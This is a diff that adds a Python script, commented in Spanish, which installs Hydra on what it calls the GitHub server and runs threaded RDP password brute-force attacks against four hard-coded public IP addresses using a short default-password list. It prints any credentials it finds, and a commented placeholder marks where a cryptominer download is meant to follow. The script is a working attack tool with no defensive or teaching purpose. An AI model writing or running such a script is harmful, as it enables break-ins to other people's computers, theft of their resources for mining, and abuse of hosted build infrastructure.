@@ -1,0 +1,65 @@
+import subprocess
+import threading
+import os
+import time
+
+# IPs de prueba (pon aquí las que tengan el puerto 3389 abierto)
+IPS = [
+    "191.179.121.105", 
+    "1.98.8.189", 
+    "178.171.88.254",
+    "36.112.247.92"
+]
+
+# Creamos un diccionario más grande (Hydra lo leerá de aquí)
+PASSWORDS = """admin
+123456
+password
+root
+1234
+admin123
+P@ssw0rd
+qwerty
+letmein
+123456789
+12345678
+12345
+adminadmin
+administrator
+111111
+000000
+"""
+
+def setup_hydra():
+    print("[*] Instalando Hydra en el servidor de GitHub...", flush=True)
+    subprocess.run(["sudo", "apt-get", "update", "-y"], stdout=subprocess.DEVNULL)
+    subprocess.run(["sudo", "apt-get", "install", "hydra", "-y"], stdout=subprocess.DEVNULL)
+    
+    with open("passwords.txt", "w") as f:
+        f.write(PASSWORDS)
+    print("[+] Hydra instalado y diccionario listo.", flush=True)
+
+def attack_rdp(ip):
+    print(f"\n[*] Lanzando Hydra contra {ip} (RDP)...", flush=True)
+    # -t 4: 4 hilos por IP, -f: parar al primer acierto
+    cmd = f"hydra -t 4 -V -f -l Administrator -P passwords.txt rdp://{ip}"
+    
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
+        if "host:" in result.stdout and "password:" in result.stdout:
+            print(f"\n[+] !!! EXITO TOTAL EN {ip} !!!", flush=True)
+            print(result.stdout, flush=True)
+            # AQUÍ VA EL COMANDO PARA DESCARGAR EL MINERO
+            # subprocess.run(f"xfreerdp /v:{ip} /u:Administrator /p:PASSWORD_ENCONTRADA ...")
+        else:
+            print(f"[-] {ip} rechazó el ataque.", flush=True)
+    except subprocess.TimeoutExpired:
+        print(f"[-] {ip} tardó demasiado. Abortando.", flush=True)
+
+if __name__ == "__main__":
+    setup_hydra()
+    print("\n[*] Iniciando ataque masivo...", flush=True)
+    
+    for ip in IPS:
+        t = threading.Thread(target=attack_rdp, args=(ip,))
+        t.start()
